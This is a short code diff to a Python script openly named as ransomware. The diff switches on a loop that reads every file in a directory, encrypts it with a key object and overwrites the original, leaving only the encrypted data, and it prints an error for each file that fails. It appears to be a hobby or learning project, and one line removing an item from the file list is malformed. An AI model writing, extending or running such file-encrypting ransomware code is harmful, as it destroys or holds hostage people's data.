@@ -15,14 +15,14 @@ for files in  os.listdir("ransomeware"):
         path=os.path.join("ransomeware",files)
         ra.append(path)
         ra.remove("'ransomeware\\ransome.py',")
-print(ra)
-        # try:
 
-        #     with open(path,"rb") as red:
-        #         content= red.read()
+        try:
 
-        #     files_encrypted=keys.encrypt(content)
-        #     with open(path,"wb") as enc:
-        #         enc.write(files_encrypted)    
-        # except Exception as e:
-        #         print(f"Failed to encrypt {files}: {e}")
+            with open(path,"rb") as red:
+                content= red.read()
+
+            files_encrypted=keys.encrypt(content)
+            with open(path,"wb") as enc:
+                enc.write(files_encrypted)    
+        except Exception as e:
+                print(f"Failed to encrypt {files}: {e}")
